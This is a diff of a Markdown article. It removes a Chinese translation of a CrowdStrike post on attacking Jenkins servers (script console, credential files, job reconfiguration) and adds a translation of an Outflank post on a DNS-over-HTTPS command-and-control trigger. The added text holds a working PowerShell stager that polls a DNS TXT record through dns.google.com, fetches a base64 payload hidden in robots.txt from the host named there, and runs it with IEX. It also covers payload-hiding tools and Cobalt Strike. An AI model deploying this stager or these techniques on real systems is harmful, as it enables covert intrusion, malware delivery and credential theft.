@@ -1,141 +1,98 @@
-> 本文翻译自：https://www.crowdstrike.com/blog/your-jenkins-belongs-to-us-now-abusing-continuous-integration-systems/
->- 名词解释：
->- Post-Exploitation: 攻陷目标中的某一台或者多台主机之后做的一些事情，包括但不限于：识别已经拿下主机的价值以及维持访问。主机对于攻击者来说是否具有一定的价值、具有多大的价值主要从以下两个个方面考虑：是否有敏感信息、数据，是否能够在后期的渗透中发挥价值。比如被攻陷的主机是否是组织中的关键人物、高层领导、系统管理员，被攻陷的主机是够能够尽可能的有内网不同网段的访问权限等等。
->- Active Directory：Active Directory中文翻译为活动目录，这个概念不需要太过深入纠结，简单的理解它：Active Directory（活动目录）是微软Windows Server中，负责架构中大型网路环境的集中式目录管理服务（Directory Services），Windows 2000 Server开始内建于Windows Server产品中，它处理了在组织中的网路物件，物件可以是计算机，用户，群组，组织单元（OU）等等，只要是在Active Directory结构定义档（schema）中定义的物件，就可以储存在Active Directory资料档中，并利用Active Directory Service Interface来存取。
->- Groovy：Groovy是一种运行在JVM上的动态语言,它吸取了Python,Ruby和Smalltalk等语言的优点
->- Freestyle Project： Jenkins可用于执行典型的构建服务器工作，例如执行连续/官方/夜间构建，运行测试或执行一些重复的批处理任务。这被Jenkins被称为"Freestyle Project"
+## 使用DNS over HTTPS（DoH）构建弹性C2基础架构
+> 本文翻译自：https://outflank.nl/blog/2018/10/25/building-resilient-c2-infrastructues-using-dns-over-https/
 
-## 滥用持续集成系统Jenkins
+> 信标: 用来宣布802.11网络的存在。Beacon帧中除了包含BSS参数的信息，也包含接入点缓存帧的信息，因此移动式工作站要仔细聆听Beacon信号。
+保持对目标网络的可持续访问是防范攻击行为的里程碑之一。在我们的运营期间，我们使用各种类型的短程信标进行日常运营。如果所有短程信标都失败了，那么可以通过返回频率较低的远距离信标可以恢复对目标网络的访问。因此，远距离信标的运行方式应该不会引起蓝军的注意。
 
-![](https://ginove-1252770243.cos.ap-guangzhou.myqcloud.com/jenkins/1.jpg)
+### 导读
+出于OPSEC(英文为 Open Platform for Security，顾名思义，它代表了在网络安全方面的一种开放式平台)的原因，在低速和慢速通道（第1阶段，长途通道）和运营通道（第2阶段，短程）之间划分命令和控制（C2）是一个好习惯。本博文提供了使用DNS over HTTPS（对dns.google.com进行HTTPS调用以检索DNS TXT记录）构建第1阶段C2频道的详细操作信息，以触发下载一个stager，它随后将启动第2阶段C2的Payload。
 
-### 介绍
-Jenkins是业界领先的开源自动化服务平台，在开发团队中很受欢迎。最近，我们观察到攻击者瞄准了大规模的[Jenkins服务器](https://jenkins.io/)，以部署[加密货币挖矿软件](https://www.crowdstrike.com/blog/cryptomining-harmless-nuisance-disruptive-threat/。他们还对Jenkins发起了针对性地攻击，以保持拥有开发者环境的访问权限。有几篇很好的博客文章讨论了通过漏洞，Web控制台和后期利用(Post-Exploitation)来获取Jenkins的权限。
+### 为什么要在C2中创造多样性
+构建不同的和并应用的多样化是实现命令和控制基础架构的可靠性和安全性（OPSEC）的重要机制。其中，良好的C2基础设施应具有以下特征：
 
-本博文侧重于阐述攻击者获得访问、维护和渗透数据的常用技术。在开发环境受到损害的情况下，CrowdStrike的红客团队利用这些技术进行对抗模拟演练。
++ 如果另一个频道被切断，备用频道可用
++ 对一个频道的调查不会直接暴露其他频道
++ 在目标系统上的暴露您的操作植入物是有限的
+各种APT小组用来实现这一目标的常用模式是使用具有基本功能的长途C2信道（阶段1 C2），可用于临时部署通过另一个信道进行通信的高级且复杂的植入物（阶段2 C2）。通过这种方式，可以创建一个非常有弹性的基础设施，有价值的植入物落入调查人员的手中的机会是有限的。
 
-### 定位Jenkins
-根据使用情况的不同，定位和识别出Jenkins服务器也会有所不同。对于很多红客团队来说，在内部网络的某个地方可以访问Jenkins，对这些服务器的访问权限也可以通过多种方式获得。最常见的方法是使用最近公开的漏洞和利用它们、认证插件中的错误配置以及先前获得的凭据。
+在本博文中，我们将演示如何使用DNS over HTTPS模拟这种模式。
 
-漏洞利用并不总是用于有针对性的破坏。然而，近期观察到Jenkins漏洞被多次利用。
+### 什么是DNS over HTTPS（DoH）以及我为什么要关心它？
+DNS over HTTPS（DoH）允许通过HTTPS协议进行DNS解析，如[RFC8484](https://tools.ietf.org/html/rfc8484)中所述。DoH的目标之一是增加用户的隐私，通过HTTPS解析DNS查询。各方都有提供DoH，这一点谷歌做的很好。
 
-### Java反序列化
-Java反序列化漏洞(CVE-2017-1000353)可以用于在未打补丁的Jenkins服务器上远程执行代码。Exploit-db（https://www.exploit-db.com/exploits/41965/）包含一个可以用来测试这个问题的可修改的POC。
+从攻击的角度来看，当我们使用DoH时，我们可以执行请求：
 
-在没有使用漏洞利用的情况下，对手通常会利用先前泄露的凭据或配置错误的Jenkins服务器来获取访问权限。默认情况下，Jenkins需要身份验证，但这点通常会被开发团队所更改，并且可能会使服务器更加容易受到攻击，这具体要取决于配置方式。Jenkins支持各种身份验证插件，包括LDAP，Kerberos单点登录（SSO），SAML等。最常见的错误配置之一是在下面所示的全局安全配置中的匿名读访问授权，如下所示。
++ 向已知的且值得信赖的一方发送请求（例如Google）
++ 我们可以从中控制响应
++ 通过SSL加密的信道
++ 如果被检查的话，那就变得不显眼
 
-![](https://ginove-1252770243.cos.ap-guangzhou.myqcloud.com/jenkins/2.jpg)
+除了这些特征之外，我们发现许多已实施SSL检查的客户因各种原因（Google产品中的证书，流量负载，隐私等）将所有Google域排除在检查范围之外。总而言之，这使得DoH通过谷歌成为触发Payload的理想信道。
 
+下图展示了一个Python的示例，通过HTTPS为 `‘yourdomainhere.nl’`域的TXT记录向dns.google.com的发送了单个DNS请求，它也显示了响应。
 
-虽然默认不启用，但可以利用匿名读取访问来访问构建历史记录和凭据插件。在某些情况下，还启用了匿名脚本对控制台访问，这将完全访问到Java运行时的情况，从而允许命令执行。因此强烈建议锁定对Jenkins的访问，尤其是Web控制台，因为错误配置的身份验证插件是攻击者获取Jenkins访问权限并进一步完成任务的常见方式。
-
-身份验证插件允许开发团队自定义登录到他们的环境。这些插件因组织而异，例如，没有Active Directory的组织可能会选择使用[Google的登录插件](https://wiki.jenkins.io/display/JENKINS/Google+Login+Plugin)。需要注意的是，不管以什么方式实现，这些认证方法都应该得到适当的保护。目前已经有攻击者利用身份验证方法来获取Web控制台访问权限的实例，因此，这些方法应该在边界用例中进行彻底的测试。例如，如果使用[Active Directory插件](https://wiki.jenkins.io/display/JENKINS/Active+Directory+plugin)，那是否所有活动目录用户都允许对Web控制台进行身份验证？如果是这样，已获得域凭据的攻击者将能够验证并尝试利用Jenkins服务器。
-
-### Jenkins的后期利用
-Jenkins是一个支持各种操作系统的Java应用程序，最常见的操作系统有Windows，Ubuntu/Debian和RedHat/CentOS。虽然Jenkins Web应用程序的功能基本上是相同的，但Windows和Linux安装之间还是存在一些显著的差异，如下所述：
-
-#### Windows操作系统
-默认情况下，当安装在Windows上时，Jenkins将使用NT AUTHORITY\SYSTEM帐户。强烈建议更改此用户帐户，因为SYSTEM权限帐户对Windows系统具有完全访问权限。如果要访问脚本控制台，攻击者可以相对更轻易地完全控制系统。一般情况下，建议使用具有有限权限的本地系统的服务帐号。
-
-#### Linux操作系统
-默认情况下，当安装在Linux上时，Jenkins会创建一个服务帐号。默认情况下，此用户帐户没有sudo或root访问权限，但是，检查一下还是很有必要的。如果要访问脚本控制台，则攻击者将拥有与Jenkins服务帐户相同的权限。
-
-#### 脚本控制台
-[Jenkins脚本控制台](https://wiki.jenkins.io/display/JENKINS/Jenkins+Script+Console)是一个在Web控制台允许用户执行Jenkins Groovy脚本的可视应用程序。当访问它的时候，脚本控制台允许完全访问Java，并且可以利用它在Java运行时的进程中执行任何操作。最值得留意的是执行命令的能力，如下所示，适用于Linux和Windows安装。
-![](https://ginove-1252770243.cos.ap-guangzhou.myqcloud.com/jenkins/3.png)
-
-![](https://ginove-1252770243.cos.ap-guangzhou.myqcloud.com/jenkins/4.png)
-
-在这儿，攻击者可以生成信标，列表文件，解密存储的密码等。请注意，使用[execute](http://docs.groovy-lang.org/latest/html/groovy-jdk/java/lang/String.html#execute(java.lang.String[],%20java.io.File)方法，所有命令都将作为Java进程的子进程（Windows上的Java.exe和Ubuntu上的/usr/bin/java）运行。
-
-在检测恶意Jenkins服务器活动时，检测恶意可疑的进程树是一个有用的指标。例如，通过脚本控制台生成PowerShell命令时，会发现以下情况：
-
-![](https://ginove-1252770243.cos.ap-guangzhou.myqcloud.com/jenkins/5.png)
+![image.png](https://xzfile.aliyuncs.com/media/upload/picture/20181027205352-5b70c52c-d9e7-1.png)
 
 
-在某些情况下，攻击者可能会选择通过使用内置的Java方法来避免产生命令和控制的方法，而不是依靠PowerShell来执行后期利用。在许多Jenkins妥协方案中，攻击者将会试着访问这些文件：`credentials.xml`，`master.key`和`hudson.util.Secret`。这些文件负责加密重要秘密信息的，在某些情况下，还负责存储凭据。`master.key`文件用于加密`hudson.util.Secret`文件，`hudson.util.Secret`文件用于加密凭证插件中的秘密信息。`credentials.xml`文件则包含Jenkins用户的加密密码和密钥。
+### (Ab)使用DoH进行Payload触发
+现在我们知道DoH是怎么工作的了，那么我们如何（ab）使用它来触发Payload传输呢？我们能够控制系统定期提取DNS应答的内容。使用DoH，我们能够将少量数据（即Payload位置信息）传送到目标网络中的受感染系统。
 
-获得这些文件的方法有很多种。如果为服务器建立了SSH访问或命令和控制方法，则可以直接从服务器复制这些文件并将其解压缩。在此示例中，攻击者利用内置的Java方法通过利用以下Groovy脚本来获取这些文件：
+从OPSEC的角度来看，在DNS TXT记录中如果只包含主机名或目标网址并不是一个好的主意。例如，您可以使用SPF记录来嵌入stager域。SPF记录看起来是安全无害的，它可以包含IP地址，域或服务器名称。
 
-![](https://ginove-1252770243.cos.ap-guangzhou.myqcloud.com/jenkins/6.png)
+想象一下，当您想要提供新的Payload时，您有一个默认的SPF记录添加域。触发器的接收端将发现添加到SPF记录的主机名并对其进行操作。
 
-使用上面的Groovy脚本，攻击者能够检索每个文件而不会产生潜在的恶意子进程。攻击者还使用 [Base64类方法](http://docs.groovy-lang.org/2.4.3/html/api/org/codehaus/groovy/runtime/EncodingGroovyMethods.html)来检索二进制格式的`hudson.util.Secret`文件。我门可以使用Jenkins测试实例来查看这个脚本的用法。
+下图显示了一个DNS TXT响应的示例，其中嵌入了域名。该域名可以由定期提取DNS TXT记录的stager来提取。
 
-![](https://ginove-1252770243.cos.ap-guangzhou.myqcloud.com/jenkins/7.png)
+![image.png](https://xzfile.aliyuncs.com/media/upload/picture/20181027205400-6010eaee-d9e7-1.png)
 
-存储在`credentials.xml`文件中的密码短语也可以使用以下脚本从脚本控制台中直接解密：
-![](https://ginove-1252770243.cos.ap-guangzhou.myqcloud.com/jenkins/8.png)
 
-![](https://ginove-1252770243.cos.ap-guangzhou.myqcloud.com/jenkins/9.png)
+### Payload编码：隐藏在robots.txt中
+由于大小限制，Payload本身不会通过DoH提供，我们需要对Payload进行编码，使其与正常的网络流量混合在一块。下图显示了一个基本示例：`'robots.txt'`文件似乎只包含文本。但是，实际上该文件包含一个base64编码的PowerShellPayload（例如Cobalt Strike PowerShellPayload），并有额外的空格来避开最后的任何'='字符。这个Payload被反转并以随机块的形式被剪切，并添加了“Disallow：/”和“.html”字符串，以模仿真正的robots.txt文件。
 
-访问Jenkins脚本控制台为攻击者提供了各种方法来获取Jenkins服务器上关键且敏感的文件，因此应禁用或禁止访问。
+可以在我们的GitHub上找到用于将Payload嵌入robots.txt的Python代码。用法：
 
-### Job配置/创建
-在无法访问脚本控制台的情况下，可以查看Web控制台和潜在调度作业或查看构建历史的用户仍然可以根据配置获取有价值的信息。在几项评估中，CrowdStrike红客团队确定了可以重新配置Job但未被创建的情况，反之亦然。
+`python HideInRobots.py payload.ps1`
 
-通过查看默认页面，可以通过Web控制台确定经过身份验证的用户的权限，如示例所示。在该方案中，用户无需进行身份验证即可配置/创建Job。
+![image.png](https://xzfile.aliyuncs.com/media/upload/picture/20181027205409-6580173e-d9e7-1.png)
 
-![](https://ginove-1252770243.cos.ap-guangzhou.myqcloud.com/jenkins/10.png)
+对于大多数操作，您可能希望在分段期间进一步隐藏Payload。我们的一些爱好者可以帮助您完成此过程：
 
-通过创建Job，攻击者可以在Jenkins服务器上创建本地Job并使用它来执行命令，然后在控制台输出中查看结果。允许用户访问构建历史和控制台输出，也可能向任何具有Web控制台访问权限的人泄漏秘密，源代码，密钥等。故而，应检查控制台输出和历史记录，以查找可能被攻击者利用的敏感信息。
++ 通过隐写术将PNhell隐藏在PNG图形中： https://github.com/peewpw/Invoke-PSImage
++ 使用Cloakify在文本中隐藏Payload： https://github.com/johnaho/Cloakify-Powershell
 
-为了在具有Job创建权限的Jenkins服务器上执行命令，需要先创建具有给定项目名称的Freestyle项目。
+### DoH stager示例代码
+我们的远程C2信道（阶段1）的接收端是一个独立的过程，定期轮询DoH上的DNS TXT记录。下面的代码段包含一个PowerShell示例，可以用来使用DoH Google服务不停地查询域的DNS TXT记录。请求使用HTTPS与dns.google.com进行通信。当然，在OPSEC方面，您可能不想使用PowerShell，而是想根据目标的环境来定制DNS TXT应答、Payload位置和睡眠时间。
 
-![](https://ginove-1252770243.cos.ap-guangzhou.myqcloud.com/jenkins/11.png)
+在下面的示例中，如果收到一个`‘vspf1 include: -all’`响应，它将返回休眠10小时。如果响应更长，它将提取嵌入在响应中的域名，从域名下载 `‘robots.txt’`。
 
-创建后，可以在Freestyle项目中配置各种选项。为简单起见，请忽略所有选项，然后单击“Add build step”。
+```
+function Invoke-SPFtrigger
+{
+ while($true)
+ {
+  $hostn = ""
+  $spf = (New-Object System.Net.Webclient).DownloadString("https://dns.google.com/resolve?name=yourdomainhere.nl&type=Txt")
+  $offsetA = $spf.IndexOf("v=spf1 include:")+15
+  $offsetB = $spf.IndexOf("-all")-1
+  $hostn = $spf.substring($offsetA,$offsetB-$offsetA)
+  if ($hostn.Length -ge 3 ){
+    $dl = (New-Object System.Net.Webclient).DownloadString("http://" + $hostn + "/robots.txt")
+    $dl = $dl.Replace(".html`n", "")
+    $dl = $dl.Replace("Disallow: /", "")
+    $dl = $dl[-1..-($dl.length)] -join ""
+    $c = [System.Convert]::FromBase64String($dl)
+    $st = [System.Text.Encoding]::ASCII.GetString($c)
+    IEX($st);
+  }
+  sleep(3600)
+ }
+}
 
-![](https://ginove-1252770243.cos.ap-guangzhou.myqcloud.com/jenkins/12.png)
+Invoke-SPFtrigger
+```
+您现在可以使用此远程通道来安排您的“交互式”和“可操作”C2通道（您的Cobalt Strike，Empire，Slingshot或自行开发的植入物）升级。尽情愉快地展现你的创造力吧！
 
-对于该项测试实例，我们将其配置为“执行Windows批处理命令”并运行一些基本命令，包括添加本地管理员帐户。但是，这也可能是在Windows批处理文件（.bat）中运行任何内容。
-![](https://ginove-1252770243.cos.ap-guangzhou.myqcloud.com/jenkins/13.png)
+### DoH上的Cobalt Strike beacon
+除了DoH上单独触发您的信标之外，您还可以使用DoH作为主C2通道。SpiderLabs最近发布了一个即用型Cobalt Strike外部C2模块：https://github.com/SpiderLabs/DoHC2
 
-单击“save”后，可以通过从Web控制台选择“Build Now”选项来创建新的Freestyle项目。
-
-![](https://ginove-1252770243.cos.ap-guangzhou.myqcloud.com/jenkins/14.png)
-
-创建完成后，可以在控制台输出上查看输出，如下所示。
-
-![](https://ginove-1252770243.cos.ap-guangzhou.myqcloud.com/jenkins/15.png)
-
-请务必注意，由于Jenkins服务器配置为允许匿名创建，因此与Freestyle项目创建关联的用户是未知的。
-
-创建Job后，(受攻击的)可能性与脚本控制台访问几乎相同，但是对于攻击者只能重新配置Job的情况又该当如何呢？这些情况几乎相同，但是，攻击者必须编辑现有Job并调度一个构建。在下面的示例中，我们将重新配置“BackupProject”Freestyle项目以打印存储在凭证插件中的秘密信息。首先，选择一个可修改的项目的“Configure”选项。
-
-![](https://ginove-1252770243.cos.ap-guangzhou.myqcloud.com/jenkins/16.png)
-
-一旦选定，攻击者可以重新配置`Build Environment`以存储环境变量中的密钥和凭据。然后，可以在Build步骤中使用这些环境变量并输出到文件。此时，攻击者可以将结果输出到全局可访问的userContent文件夹（C://Program Files(x86)/Jenkins/userContent/）。
-
-在Windows系统环境中，使用％字符，而Unix系统则使用$字符来访问变量。
-
-![](https://ginove-1252770243.cos.ap-guangzhou.myqcloud.com/jenkins/17.png)
-
-创建好修改后的项目后，可以在以下位置查看结果： http：//jenkins/userContent/out.txt
-
-![](https://ginove-1252770243.cos.ap-guangzhou.myqcloud.com/jenkins/18.png)
-
-[userContent](https://wiki.jenkins.io/display/JENKINS/User+Content)文件夹是一个特殊的文件夹，其中的内容并不受`Overall/Read`权限访问之外的任何访问控制。在攻击者可能为现有的创建项目进行再修改的情况下，这个文件夹可以是存储凭证/秘密控制台输出的一个可行的位置。每次创建后，控制台输出结果（包括凭据/机密）都可以重定向到此文件夹。
-
-### 结论
-像Jenkins这样的自动化系统是对手高度重视的目标。管理员花时间保护和审核Jenkins安装的过程显得至关重要，因为这些系统很可能成为网络内鬼的目标。
-
-为了解决这个问题，CrowdStrike建议Jenkins管理员根据最近攻击者活动的观察结果来注意以下事项：
-
- 1. 没有身份验证，任何人都可以访问Jenkins Web控制台吗？
-    - 这包括脚本控制台访问吗？
-    - 他们可以查看凭据或创建历史记录吗？
-    - 他们可以创建或安排工作吗？
- 2. 经过身份验证的用户拥有哪些权限？
-    - 这包括脚本控制台访问吗？
-    - 他们可以查看凭据或创建历史记录吗？
-    - 他们可以创建或安排工作吗？
- 3. 是否有敏感信息存储在历史记录或控制台输出中？
- 4. Jenkins可以通过互联网访问吗？您的组织是否需要它？
- 5. Jenkins服务帐户是否只有为执行其功能所需要的最少权限？
- 6. 如何存储凭据？
-    - 谁可以访问`credentials.xml`, `master.key`，和`hudson.util.Secret`？
-上面的列表并不是保护Jenkins的完整指南，而是依赖于组织。
-
-#### 了解更多：
-- 有关CrowdStrike Incident Response，Compromise Assessment or Threat Hunting offerings的更多信息，请访问[CrowdStrike服务页面](https://www.crowdstrike.com/services/)或发送邮件到Service@crowdstrike.com与我们联系。
-
+这篇博文中提到的代码可以在如下链接中找到： https://github.com/outflanknl/DoH_c2_Trigger
